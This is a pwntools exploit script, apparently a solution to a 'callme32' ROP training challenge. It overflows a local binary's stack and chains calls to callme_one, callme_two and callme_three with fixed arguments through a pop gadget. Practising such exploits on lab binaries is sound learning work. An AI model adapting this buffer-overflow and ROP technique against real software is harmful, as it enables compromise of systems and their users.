from pwn import *

DEBUG = False

elf = ELF("./callme32")
gs = """
b *callme_one 
b *callme_one+279
b *callme_two
"""
if DEBUG:
    io = gdb.debug(elf.path, gdbscript=gs)
else:
    io = process(elf.path)

offset = 44
params = (0xdeadbeef, 0xcafebabe, 0xd00df00d)
packed_params = b"".join([p32(param) for param in params])

# found using ropper
pop3 = 0x80487f9     # pop esi; pop edi; pop ebp; ret;

payload = cyclic(offset) + \
    p32(elf.sym.callme_one) + p32(pop3) + packed_params + \
    p32(elf.sym.callme_two) + p32(pop3) + packed_params + \
    p32(elf.sym.callme_three) + b"AAAA" + packed_params

io.sendline(payload)
io.wait()  # for debugging in gdb
io.recvuntil("Thank you!\n")
print(io.recv().decode())
